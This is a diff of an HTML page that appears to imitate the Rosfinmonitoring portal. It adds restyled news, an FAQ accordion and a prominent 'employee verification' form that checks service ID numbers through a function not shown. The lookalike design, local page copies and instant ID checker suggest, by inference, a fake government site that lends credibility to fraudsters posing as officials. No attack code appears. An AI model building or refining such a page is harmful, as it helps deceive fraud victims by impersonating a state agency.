@@ -16,27 +16,27 @@
             background: #f0f4f7 !important;
             color: #1a1a2e !important;
         }
-        body { 
+        body {
             background: #f0f4f7 !important;
             color: #1a1a2e !important;
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            margin: 0; 
-            padding: 0; 
-            overflow-x: hidden; 
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
         }
         * {
             color-scheme: light !important;
             box-sizing: border-box;
         }
-        
-        .navbar-custom { 
-            background-color: #0a1f33; 
-            height: 85px; 
-            display: flex; 
-            align-items: center; 
-            padding: 0 30px; 
-            color: #fff; 
-            border-bottom: 4px solid #c5a059; 
+
+        .navbar-custom {
+            background-color: #0a1f33;
+            height: 85px;
+            display: flex;
+            align-items: center;
+            padding: 0 30px;
+            color: #fff;
+            border-bottom: 4px solid #c5a059;
             justify-content: space-between;
             position: fixed;
             top: 0;
@@ -47,37 +47,37 @@
             box-sizing: border-box;
         }
 
-        .logo-area { 
-            display: flex; 
-            align-items: center; 
-            gap: 15px; 
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 15px;
             cursor: pointer;
         }
-        .emblem-img { 
-            height: 60px; 
-            width: auto; 
+        .emblem-img {
+            height: 60px;
+            width: auto;
         }
-        .logo-text h1 { 
-            margin: 0; 
-            font-size: 18px; 
-            font-weight: bold; 
-            letter-spacing: 0.5px; 
+        .logo-text h1 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
         }
-        .logo-text p { 
-            margin: 0; 
-            font-size: 10px; 
-            color: #a0b2c6; 
-            text-transform: uppercase; 
+        .logo-text p {
+            margin: 0;
+            font-size: 10px;
+            color: #a0b2c6;
+            text-transform: uppercase;
         }
         .portal-status {
-            font-size: 12px; 
-            font-weight: bold; 
+            font-size: 12px;
+            font-weight: bold;
             color: #a0b2c6;
             white-space: nowrap;
         }
 
         .hero-banner {
-            background-color: #0a1f33; 
+            background-color: #0a1f33;
             width: 100%;
             display: flex;
             justify-content: center;
@@ -87,7 +87,7 @@
         }
         .hero-banner img {
             width: 100%;
-            max-width: 1920px; 
+            max-width: 1920px;
             height: auto;
             display: block;
         }
@@ -99,14 +99,6 @@
             box-sizing: border-box;
         }
 
-        .top-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 30px;
-            margin-bottom: 40px;
-            align-items: start;
-        }
-
         .news-box {
             background: white;
             border: 1px solid #dce3e8;
@@ -114,6 +106,7 @@
             padding: 25px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.02);
             box-sizing: border-box;
+            margin-bottom: 40px;
         }
         .section-title {
             font-size: 20px;
@@ -126,58 +119,17 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        
+
         .news-card-wrapper {
             display: flex;
             flex-direction: column;
             gap: 20px;
         }
 
-        .verification-box {
-            background: white;
-            border: 1px solid #dce3e8;
-            border-radius: 4px;
-            padding: 25px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
-            box-sizing: border-box;
-        }
-        .verification-box p {
-            font-size: 13px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .input-style {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            font-size: 14px;
-            box-sizing: border-box;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-        }
-        .btn-verify {
-            width: 100%;
-            background-color: #005695;
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 14px;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.2s;
-            text-transform: uppercase;
-        }
-        .btn-verify:hover {
-            background-color: #0a1f33;
-        }
-
         /* ======================================== */
         /* БАННЕРЫ — НОВАЯ ВЕРСИЯ (ЧИСТО)          */
         /* ======================================== */
-        
+
         /* ---- ПУЛЬСАЦИЯ ---- */
         @keyframes pulse-glow {
             0%, 100% { box-shadow: 0 4px 20px rgba(197, 160, 89, 0.25); }
@@ -511,7 +463,7 @@
         }
 
         /* ======================================== */
-        /* FAQ                                      */
+        /* FAQ (АККОРДЕОН)                          */
         /* ======================================== */
         .faq-section {
             width: 100%;
@@ -548,42 +500,89 @@
         .faq-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
+            gap: 16px;
             margin-bottom: 30px;
+            align-items: start;
         }
 
         .faq-item {
             background: #f8fafc;
             border: 1px solid #edf2f7;
             border-radius: 10px;
-            padding: 20px 24px;
             transition: all 0.25s ease;
+            overflow: hidden;
         }
 
         .faq-item:hover {
-            background: #ffffff;
             border-color: #c5a059;
             box-shadow: 0 4px 14px rgba(0,0,0,0.04);
-            transform: translateY(-2px);
         }
 
-        .faq-icon {
-            font-size: 28px;
-            margin-bottom: 8px;
+        .faq-item.open {
+            background: #ffffff;
+            border-color: #005695;
+            box-shadow: 0 6px 20px rgba(0,86,149,0.08);
         }
 
-        .faq-item h4 {
+        .faq-question {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 18px 22px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            width: 100%;
+            text-align: left;
+            font-family: inherit;
             font-size: 15px;
-            color: #0a1f33;
-            margin: 0 0 6px 0;
             font-weight: 600;
+            color: #0a1f33;
+            line-height: 1.4;
         }
 
-        .faq-item p {
-            font-size: 13px;
+        .faq-question:hover {
+            color: #005695;
+        }
+
+        .faq-item.open .faq-question {
+            color: #005695;
+        }
+
+        .faq-q-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+            line-height: 1.2;
+        }
+
+        .faq-q-text {
+            flex: 1;
+        }
+
+        .faq-arrow {
+            flex-shrink: 0;
+            font-size: 12px;
+            color: #8b9aab;
+            transition: transform 0.3s ease;
+            margin-top: 4px;
+        }
+
+        .faq-item.open .faq-arrow {
+            transform: rotate(180deg);
+            color: #005695;
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.35s ease;
+        }
+
+        .faq-answer-inner {
+            padding: 0 22px 20px 54px;
+            font-size: 14px;
             color: #5a6b7a;
-            margin: 0;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
         .faq-footer {
@@ -689,7 +688,7 @@
             flex-wrap: wrap;
         }
         .coop-logo {
-            height: 120px; 
+            height: 120px;
             width: auto;
             object-fit: contain;
         }
@@ -699,6 +698,181 @@
             color: #666;
             max-width: 900px;
             margin: 0 auto;
+        }
+
+        /* ======================================== */
+        /* ПРОВЕРКА СОТРУДНИКА (НОВЫЙ БЛОК)         */
+        /* ======================================== */
+        .verify-employee-wrapper {
+            width: 100%;
+            margin: 0 0 40px 0;
+        }
+
+        .verify-employee-card {
+            position: relative;
+            display: flex;
+            align-items: stretch;
+            background: linear-gradient(135deg, #0a1f33 0%, #14395c 55%, #0a1f33 100%);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(197, 160, 89, 0.25);
+            box-shadow: 0 6px 30px rgba(0,0,0,0.1);
+            transition: box-shadow 0.35s ease, border-color 0.35s ease;
+        }
+
+        .verify-employee-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #c5a059, #f0d080, #c5a059);
+            opacity: 0.7;
+        }
+
+        .verify-employee-card:hover {
+            border-color: #c5a059;
+            box-shadow: 0 16px 50px rgba(0,0,0,0.16);
+        }
+
+        .verify-employee-icon {
+            flex: 0 0 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background:
+                radial-gradient(circle at 50% 50%, rgba(197,160,89,0.18) 0%, transparent 70%),
+                linear-gradient(135deg, rgba(255,255,255,0.04), transparent);
+            border-right: 1px solid rgba(197,160,89,0.18);
+            position: relative;
+        }
+
+        .verify-shield {
+            font-size: 64px;
+            line-height: 1;
+            filter: drop-shadow(0 0 18px rgba(197,160,89,0.45));
+            animation: pulse-glow 3s ease-in-out infinite;
+            width: 96px;
+            height: 96px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(197,160,89,0.12);
+            border: 1px solid rgba(197,160,89,0.35);
+        }
+
+        .verify-employee-body {
+            flex: 1;
+            padding: 32px 38px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 14px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .verify-label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #c5a059;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .verify-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffffff;
+            margin: 0;
+            line-height: 1.15;
+        }
+
+        .verify-desc {
+            font-size: 14px;
+            color: rgba(255,255,255,0.78);
+            margin: 0;
+            line-height: 1.5;
+            max-width: 640px;
+        }
+
+        .verify-form {
+            display: flex;
+            gap: 12px;
+            margin-top: 4px;
+            flex-wrap: wrap;
+            align-items: stretch;
+        }
+
+        .verify-input {
+            flex: 1 1 260px;
+            min-width: 200px;
+            padding: 14px 16px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.06);
+            color: #ffffff;
+            border-radius: 10px;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            outline: none;
+            transition: all 0.25s ease;
+            font-family: inherit;
+        }
+        .verify-input::placeholder {
+            color: rgba(255,255,255,0.35);
+            text-transform: none;
+            letter-spacing: 0;
+            font-size: 14px;
+        }
+        .verify-input:focus {
+            border-color: #c5a059;
+            background: rgba(255,255,255,0.1);
+            box-shadow: 0 0 0 3px rgba(197,160,89,0.18);
+        }
+
+        .verify-btn {
+            flex: 0 0 auto;
+            padding: 14px 40px;
+            background: linear-gradient(135deg, #c5a059, #d4b06a);
+            color: #0a1f33;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            animation: pulse-glow 2.5s ease-in-out infinite;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .verify-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            background: linear-gradient(135deg, #d4b06a, #e8c880);
+        }
+        .verify-btn:disabled {
+            cursor: progress;
+            opacity: 0.85;
+            animation: none;
+        }
+
+        .verify-status {
+            font-size: 13px;
+            min-height: 18px;
+            color: #ffd9a0;
+            font-weight: 600;
+        }
+
+        .verify-hint {
+            font-size: 12px;
+            color: rgba(255,255,255,0.45);
+            margin: 0;
         }
 
         /* ======================================== */
@@ -736,26 +910,66 @@
             border-radius: 4px;
             border: 1px solid #ced4da;
             overflow: hidden;
+            position: relative;
+        }
+
+        .map-placeholder {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            background:
+                radial-gradient(circle at 50% 40%, rgba(0,86,149,0.06) 0%, transparent 70%),
+                repeating-linear-gradient(0deg, #edf1f4, #edf1f4 24px, #e6ebf0 24px, #e6ebf0 25px),
+                repeating-linear-gradient(90deg, #edf1f4, #edf1f4 24px, #e6ebf0 24px, #e6ebf0 25px);
+            cursor: pointer;
+            border: none;
+            font-family: inherit;
+            width: 100%;
+            height: 100%;
+            transition: background 0.2s;
+        }
+        .map-placeholder:hover {
+            background:
+                radial-gradient(circle at 50% 40%, rgba(0,86,149,0.1) 0%, transparent 70%),
+                repeating-linear-gradient(0deg, #edf1f4, #edf1f4 24px, #e6ebf0 24px, #e6ebf0 25px),
+                repeating-linear-gradient(90deg, #edf1f4, #edf1f4 24px, #e6ebf0 24px, #e6ebf0 25px);
+        }
+        .map-placeholder-pin {
+            font-size: 40px;
+            filter: drop-shadow(0 4px 10px rgba(0,0,0,0.15));
+        }
+        .map-placeholder-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0a1f33;
+        }
+        .map-placeholder-sub {
+            font-size: 12px;
+            color: #8b9aab;
         }
 
         /* ======================================== */
         /* ПОДВАЛ                                   */
         /* ======================================== */
-        .footer-profile { 
-            background-color: #0a1f33; 
-            color: #fff; 
-            padding: 30px 0; 
-            font-size: 12px; 
-            border-top: 4px solid #c5a059; 
+        .footer-profile {
+            background-color: #0a1f33;
+            color: #fff;
+            padding: 30px 0;
+            font-size: 12px;
+            border-top: 4px solid #c5a059;
         }
-        .footer-container { 
-            max-width: 1200px; 
-            margin: 0 auto; 
-            padding: 0 20px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between; 
-            box-sizing: border-box; 
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-sizing: border-box;
             gap: 20px;
         }
         .footer-logo-block {
@@ -763,19 +977,19 @@
             align-items: center;
             gap: 15px;
         }
-        .footer-emblem { 
-            height: 50px; 
-            width: auto; 
+        .footer-emblem {
+            height: 50px;
+            width: auto;
         }
         .footer-text-block {
             max-width: 600px;
             text-align: right;
         }
-        .footer-copyright { 
-            color: #8fa2b5; 
-            font-size: 11px; 
-            font-weight: bold; 
-            text-align: right; 
+        .footer-copyright {
+            color: #8fa2b5;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: right;
         }
 
         /* ======================================== */
@@ -886,37 +1100,50 @@
             .cbr-banner-title {
                 font-size: 28px !important;
             }
+            .verify-employee-icon {
+                flex: 0 0 140px;
+            }
+            .verify-shield {
+                font-size: 48px;
+                width: 76px;
+                height: 76px;
+            }
+            .verify-employee-body {
+                padding: 28px 28px;
+            }
+            .verify-title {
+                font-size: 24px;
+            }
         }
 
         @media screen and (max-width: 768px) {
-            .navbar-custom { 
-                padding: 0 15px; 
-                height: 70px; 
+            .navbar-custom {
+                padding: 0 15px;
+                height: 70px;
             }
-            .emblem-img { 
-                height: 40px; 
+            .emblem-img {
+                height: 40px;
             }
-            .logo-text h1 { 
-                font-size: 13px; 
-                line-height: 1.2; 
+            .logo-text h1 {
+                font-size: 13px;
+                line-height: 1.2;
             }
-            .logo-text p { 
-                font-size: 7.5px; 
-                line-height: 1.2; 
+            .logo-text p {
+                font-size: 7.5px;
+                line-height: 1.2;
             }
-            .portal-status { 
-                display: none; 
+            .portal-status {
+                display: none;
             }
-            .hero-banner { 
-                margin-top: 70px; 
+            .hero-banner {
+                margin-top: 70px;
             }
-            .main-content-container { 
-                margin: 20px auto; 
-                padding: 0 15px; 
+            .main-content-container {
+                margin: 20px auto;
+                padding: 0 15px;
             }
-            .top-grid { 
-                grid-template-columns: 1fr; 
-                gap: 20px; 
+            .news-box {
+                margin-bottom: 25px;
             }
 
             /* === ПРИЕМНАЯ (ТЕЛЕФОН) === */
@@ -1033,7 +1260,46 @@
                 letter-spacing: 1.5px !important;
             }
 
-            /* === ОСТАЛЬНОЕ === */
+            /* === ПРОВЕРКА СОТРУДНИКА (ТЕЛЕФОН) === */
+            .verify-employee-card {
+                flex-direction: column !important;
+                border-radius: 14px !important;
+            }
+            .verify-employee-icon {
+                flex: 0 0 auto !important;
+                width: 100% !important;
+                padding: 22px 0 8px 0 !important;
+                border-right: none !important;
+                border-bottom: 1px solid rgba(197,160,89,0.15) !important;
+            }
+            .verify-shield {
+                font-size: 44px !important;
+                width: 72px !important;
+                height: 72px !important;
+            }
+            .verify-employee-body {
+                padding: 20px 20px 24px 20px !important;
+                gap: 10px !important;
+            }
+            .verify-title {
+                font-size: 21px !important;
+            }
+            .verify-desc {
+                font-size: 13px !important;
+            }
+            .verify-form {
+                flex-direction: column !important;
+            }
+            .verify-input {
+                flex: 1 1 auto !important;
+                width: 100% !important;
+            }
+            .verify-btn {
+                width: 100% !important;
+                padding: 13px 20px !important;
+            }
+
+            /* === FAQ === */
             .faq-container {
                 padding: 25px 20px;
             }
@@ -1043,37 +1309,43 @@
             .faq-header h2 {
                 font-size: 20px;
             }
-            .faq-item {
+            .faq-question {
                 padding: 16px 18px;
+                font-size: 14px;
             }
-            .cards-grid-container { 
-                grid-template-columns: 1fr; 
-                gap: 15px; 
+            .faq-answer-inner {
+                padding: 0 18px 18px 50px;
             }
-            .coop-logo { 
-                height: 80px; 
+
+            /* === ОСТАЛЬНОЕ === */
+            .cards-grid-container {
+                grid-template-columns: 1fr;
+                gap: 15px;
             }
-            .footer-container { 
-                flex-direction: column; 
-                text-align: center; 
-                gap: 25px; 
+            .coop-logo {
+                height: 80px;
             }
-            .footer-logo-block { 
-                flex-direction: column; 
-                text-align: center; 
+            .footer-container {
+                flex-direction: column;
+                text-align: center;
+                gap: 25px;
             }
-            .footer-logo-block div { 
-                text-align: center !important; 
+            .footer-logo-block {
+                flex-direction: column;
+                text-align: center;
             }
-            .footer-text-block { 
-                text-align: center; 
-                max-width: 100%; 
+            .footer-logo-block div {
+                text-align: center !important;
             }
-            .footer-copyright { 
-                text-align: center; 
+            .footer-text-block {
+                text-align: center;
+                max-width: 100%;
             }
-            .contacts-map-box { 
-                grid-template-columns: 1fr; 
+            .footer-copyright {
+                text-align: center;
+            }
+            .contacts-map-box {
+                grid-template-columns: 1fr;
             }
         }
 
@@ -1124,6 +1396,17 @@
                 font-size: 12px !important;
             }
 
+            .verify-employee-body {
+                padding: 16px 16px 20px 16px !important;
+            }
+            .verify-title {
+                font-size: 19px !important;
+            }
+            .verify-label {
+                font-size: 10px !important;
+                letter-spacing: 1.5px !important;
+            }
+
             #dynamic-news-wrapper .news-item {
                 flex-direction: column;
                 gap: 10px;
@@ -1138,13 +1421,12 @@
             }
         }
     </style>
-    <script src="statistik.js"></script>
 </head>
 <body>
 
     <nav class="navbar-custom">
         <div class="logo-area" onclick="window.location.href='index.html'">
-            <img src="emblem.png" class="emblem-img" alt="Герб">
+            <img src="emblem.png" class="emblem-img" alt="Герб Росфинмониторинга">
             <div class="logo-text">
                 <h1>РОСФИНМОНИТОРИНГ</h1>
                 <p>Федеральная служба по финансовому мониторингу</p>
@@ -1160,49 +1442,40 @@
     <div class="main-content-container">
 
         <!-- ======================================== -->
-        <!-- БЛОК 1: НОВОСТИ + ПРОВЕРКА СОТРУДНИКА    -->
+        <!-- БЛОК 1: НОВОСТИ (НА ВСЮ ШИРИНУ)          -->
         <!-- ======================================== -->
-        <div class="top-grid">
-            <div class="news-box">
-                <div class="section-title">Новости ведомства</div>
-                <div id="dynamic-news-wrapper" class="news-card-wrapper">
-                    <div class="news-item">
-                        <img src="otchet3_8.png" alt="Встреча с Путиным">
-                        <div class="news-info">
-                            <span class="news-date">19 июня 2026</span>
-                            <h4>Росфинмониторинг отчитался Путину: спасено 3,8 млрд рублей по госконтрактам</h4>
-                            <p>Глава ведомства Юрий Чиханчин доложил о передаче 160 материалов в правоохранительные органы, возбуждении 50 уголовных дел и аресте 2 млрд рублей. Президент поручил доводить дела до суда.</p>
-                            <a href="https://xn----8sbemlcfpa7are0cf2a9f.xn--p1ai/nacionalnye-proekty/putinu-dolozhili-o-narushenijah-rabot-po-goskontraktam-dlja-borby-s-covid-19/" class="news-link">Подробнее →</a>
-                        </div>
-                    </div>
-
-                    <div class="news-item">
-                        <img src="pupkin.png" alt="Закон">
-                        <div class="news-info">
-                            <span class="news-date">8 марта 2026</span>
-                            <h4>Путин освободил Росфинмониторинг от публикации данных о целевом обучении</h4>
-                            <p>Ведомство приравняли к силовым структурам (ФСБ, МВД, СК) — теперь оно не обязано размещать предложения о целевом обучении на публичной платформе в интересах безопасности государства.</p>
-                            <a href="https://www.pnp.ru/social/putin-osvobodil-rosfinmonitoring-ot-publikacii-dannykh-o-celevom-obuchenii.html" class="news-link">Подробнее →</a>
-                        </div>
-                    </div>
-
-                    <div class="news-item">
-                        <img src="15k.png" alt="Кибербезопасность">
-                        <div class="news-info">
-                            <span class="news-date">17 апреля 2026</span>
-                            <h4>Росфинмониторинг борется с криптомошенничеством — уроки для 15 000 человек</h4>
-                            <p>Ведомство координирует борьбу с киберпреступлениями и криптоактивами. В 2026 году провели уроки по финансовой безопасности в школах, вузах и «Артеке» — более 15 000 слушателей.</p>
-                            <a href="https://fedsfm.ru/rosfinolymp/9937" target="_blank" class="news-link">Подробнее →</a>
-                        </div>
+        <div class="news-box">
+            <div class="section-title">Новости ведомства</div>
+            <div id="dynamic-news-wrapper" class="news-card-wrapper">
+                <div class="news-item">
+                    <img src="news_putin_chihankin.png" alt="Встреча Президента с главой Росфинмониторинга" loading="lazy">
+                    <div class="news-info">
+                        <span class="news-date">5 ноября 2026</span>
+                        <h4>Путин провёл встречу с главой Росфинмониторинга Юрием Чиханчиным</h4>
+                        <p>Глава ведомства доложил об итогах 25 лет работы: выход из «чёрного списка» ФАТФ, возврат 99,5% валютной выручки, приостановка 390 млрд руб. нецелевых расходов, 480 уголовных дел по коррупции и заморозка активов террористов за 24 часа.</p>
+                        <a href="http://www.kremlin.ru/events/president/news/81190" target="_blank" rel="noopener" class="news-link">Подробнее →</a>
                     </div>
                 </div>
-            </div>
 
-            <div class="verification-box">
-                <div class="section-title">Проверка сотрудника</div>
-                <p>Введите номер служебного удостоверения для мгновенной верификации личности.</p>
-                <input type="text" id="id-input" class="input-style" placeholder="Например: ФС-125066">
-                <button onclick="checkEmployee()" class="btn-verify">Проверить</button>
+                <div class="news-item">
+                    <img src="news_25_years.png" alt="25-летие Росфинмониторинга" loading="lazy">
+                    <div class="news-info">
+                        <span class="news-date">5 ноября 2026</span>
+                        <h4>25-летие Росфинмониторинга: Путин вручил государственные награды сотрудникам</h4>
+                        <p>Президент поздравил ведомство с четвертьвековым юбилеем, отметил созданную с нуля антиотмывочную систему и поставил задачи: технологическая модернизация, внедрение ИИ, концепция финансовой безопасности и углубление сотрудничества в БРИКС, ШОС, СНГ.</p>
+                        <a href="http://kremlin.ru/events/president/news/81188" target="_blank" rel="noopener" class="news-link">Подробнее →</a>
+                    </div>
+                </div>
+
+                <div class="news-item">
+                    <img src="news_ukaz_828.png" alt="Указ Президента № 828" loading="lazy">
+                    <div class="news-info">
+                        <span class="news-date">6 ноября 2026</span>
+                        <h4>Подписан Указ № 828 об изменениях в Межведомственной комиссии по противодействию финансированию терроризма</h4>
+                        <p>Президент внёс изменения в Положение о Межведомственной комиссии по ПФТ и экстремистской деятельности (Указ от 23.10.2025 № 774). Документ официально опубликован на портале правовой информации.</p>
+                        <a href="http://publication.pravo.gov.ru/document/0001202611060013" target="_blank" rel="noopener" class="news-link">Подробнее →</a>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -1234,7 +1507,7 @@
         <!-- БЛОК: БАНК РОССИИ                        -->
         <!-- ======================================== -->
         <div class="cbr-banner-wrapper">
-            <a href="cb.html" target="_blank" class="cbr-banner-link">
+            <a href="cb.html" target="_blank" rel="noopener" class="cbr-banner-link">
                 <div class="cbr-banner-card">
                     <div class="cbr-banner-content">
                         <div class="cbr-banner-label">ОФИЦИАЛЬНЫЙ ПОРТАЛ</div>
@@ -1255,7 +1528,7 @@
         </div>
 
         <!-- ======================================== -->
-        <!-- БЛОК 4: ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ        -->
+        <!-- БЛОК 4: ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ (АККОРДЕОН) -->
         <!-- ======================================== -->
         <div class="faq-section">
             <div class="faq-container">
@@ -1265,24 +1538,44 @@
                 </div>
                 <div class="faq-grid">
                     <div class="faq-item">
-                        <div class="faq-icon">📨</div>
-                        <h4>Как подать обращение в Росфинмониторинг?</h4>
-                        <p>Через интернет-приёмную на сайте или почтовым отправлением.</p>
+                        <button type="button" class="faq-question" aria-expanded="false" aria-controls="faq-a1">
+                            <span class="faq-q-icon" aria-hidden="true">📨</span>
+                            <span class="faq-q-text">Как подать обращение в Росфинмониторинг?</span>
+                            <span class="faq-arrow" aria-hidden="true">▼</span>
+                        </button>
+                        <div class="faq-answer" id="faq-a1" role="region">
+                            <div class="faq-answer-inner">Через интернет-приёмную на сайте или почтовым отправлением.</div>
+                        </div>
                     </div>
                     <div class="faq-item">
-                        <div class="faq-icon">🔒</div>
-                        <h4>Какие данные защищены законом?</h4>
-                        <p>Персональные данные граждан и сведения о финансовых операциях, доступ к которым ограничен законодательством.</p>
+                        <button type="button" class="faq-question" aria-expanded="false" aria-controls="faq-a2">
+                            <span class="faq-q-icon" aria-hidden="true">🔒</span>
+                            <span class="faq-q-text">Какие данные защищены законом?</span>
+                            <span class="faq-arrow" aria-hidden="true">▼</span>
+                        </button>
+                        <div class="faq-answer" id="faq-a2" role="region">
+                            <div class="faq-answer-inner">Персональные данные граждан и сведения о финансовых операциях, доступ к которым ограничен законодательством.</div>
+                        </div>
                     </div>
                     <div class="faq-item">
-                        <div class="faq-icon">⚖️</div>
-                        <h4>Какие полномочия у Росфинмониторинга?</h4>
-                        <p>Анализ финансовых операций, выявление подозрительных схем и координация мер по противодействию финансовым преступлениям.</p>
+                        <button type="button" class="faq-question" aria-expanded="false" aria-controls="faq-a3">
+                            <span class="faq-q-icon" aria-hidden="true">⚖️</span>
+                            <span class="faq-q-text">Какие полномочия у Росфинмониторинга?</span>
+                            <span class="faq-arrow" aria-hidden="true">▼</span>
+                        </button>
+                        <div class="faq-answer" id="faq-a3" role="region">
+                            <div class="faq-answer-inner">Анализ финансовых операций, выявление подозрительных схем и координация мер по противодействию финансовым преступлениям.</div>
+                        </div>
                     </div>
                     <div class="faq-item">
-                        <div class="faq-icon">🔎</div>
-                        <h4>Как проверяются подозрительные операции?</h4>
-                        <p>Проводится анализ поступившей информации с использованием риск-ориентированного подхода и межведомственного взаимодействия.</p>
+                        <button type="button" class="faq-question" aria-expanded="false" aria-controls="faq-a4">
+                            <span class="faq-q-icon" aria-hidden="true">🔎</span>
+                            <span class="faq-q-text">Как проверяются подозрительные операции?</span>
+                            <span class="faq-arrow" aria-hidden="true">▼</span>
+                        </button>
+                        <div class="faq-answer" id="faq-a4" role="region">
+                            <div class="faq-answer-inner">Проводится анализ поступившей информации с использованием риск-ориентированного подхода и межведомственного взаимодействия.</div>
+                        </div>
                     </div>
                 </div>
                 <div class="faq-footer">
@@ -1296,27 +1589,27 @@
         <!-- ======================================== -->
         <div class="cards-grid-container">
             <div class="service-card">
-                <img src="card1.png" alt="СМИ о нас">
+                <img src="card1.png" alt="СМИ о нас" loading="lazy">
                 <div class="card-title">СМИ О НАС</div>
             </div>
             <div class="service-card">
-                <img src="card2.png" alt="Международный форум">
+                <img src="card2.png" alt="Международный форум" loading="lazy">
                 <div class="card-title">МЕЖДУНАРОДНЫЙ ФОРУМ</div>
             </div>
             <div class="service-card">
-                <img src="card3.png" alt="Олимпиада">
+                <img src="card3.png" alt="Олимпиада" loading="lazy">
                 <div class="card-title">ОЛИМПИАДА</div>
             </div>
             <div class="service-card">
-                <img src="card4.png" alt="Журнал">
+                <img src="card4.png" alt="Журнал Финансовая безопасность" loading="lazy">
                 <div class="card-title">ЖУРНАЛ «ФИНАНСОВАЯ БЕЗОПАСНОСТЬ»</div>
             </div>
             <div class="service-card">
-                <img src="card5.png" alt="Госуслуги">
+                <img src="card5.png" alt="Федеральный проект Государство для людей" loading="lazy">
                 <div class="card-title">ФЕДЕРАЛЬНЫЙ ПРОЕКТ «ГОСУДАРСТВО ДЛЯ ЛЮДЕЙ»</div>
             </div>
             <div class="service-card">
-                <img src="card6.png" alt="Помним, гордимся">
+                <img src="card6.png" alt="Помним, гордимся" loading="lazy">
                 <div class="card-title">ПОМНИМ, ГОРДИМСЯ</div>
             </div>
         </div>
@@ -1326,7 +1619,7 @@
         <!-- ======================================== -->
         <div class="warning-banner-wrapper">
             <a href="scammers.html">
-                <img src="warning.png" alt="ВНИМАНИЕ: МОШЕННИКИ!">
+                <img src="warning.png" alt="ВНИМАНИЕ: МОШЕННИКИ!" loading="lazy">
             </a>
         </div>
 
@@ -1336,13 +1629,36 @@
         <div class="cooperation-box">
             <div class="section-title" style="border: none; padding: 0; text-align: center;">Международное сотрудничество</div>
             <div class="logos-row">
-                <img src="fatf_logo.png" class="coop-logo" alt="FATF">
-                <img src="egmont_logo.png" class="coop-logo" alt="Egmont Group">
-                <img src="eag_logo.png" class="coop-logo" alt="EAG">
+                <img src="fatf_logo.png" class="coop-logo" alt="FATF" loading="lazy">
+                <img src="egmont_logo.png" class="coop-logo" alt="Egmont Group" loading="lazy">
+                <img src="eag_logo.png" class="coop-logo" alt="EAG" loading="lazy">
             </div>
             <p class="coop-text">
                 Росфинмониторинг осуществляет взаимодействие и ведет информационный обмен с компетентными органами ряда государств и международных организаций в сфере противодействия легализации доходов, полученных преступным путем, и финансированию терроризма.
             </p>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- БЛОК: ПРОВЕРКА СОТРУДНИКА (ПЕРЕД КАРТОЙ)-->
+        <!-- ======================================== -->
+        <div class="verify-employee-wrapper">
+            <div class="verify-employee-card">
+                <div class="verify-employee-icon" aria-hidden="true">
+                    <div class="verify-shield">🛡️</div>
+                </div>
+                <div class="verify-employee-body">
+                    <div class="verify-label">СЕРВИС ВЕРИФИКАЦИИ</div>
+                    <h2 class="verify-title">Проверка сотрудника</h2>
+                    <p class="verify-desc">Введите номер служебного удостоверения для мгновенной верификации личности сотрудника ведомства.</p>
+                    <form class="verify-form" onsubmit="return false;">
+                        <label for="id-input" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Номер служебного удостоверения</label>
+                        <input type="text" id="id-input" class="verify-input" aria-label="Номер служебного удостоверения" autocomplete="off" inputmode="text">
+                        <button type="button" onclick="checkEmployee()" class="verify-btn" id="verify-btn">Проверить</button>
+                    </form>
+                    <div class="verify-status" id="verify-status" aria-live="polite"></div>
+                    <p class="verify-hint">Номер указан на служебном удостоверении сотрудника.</p>
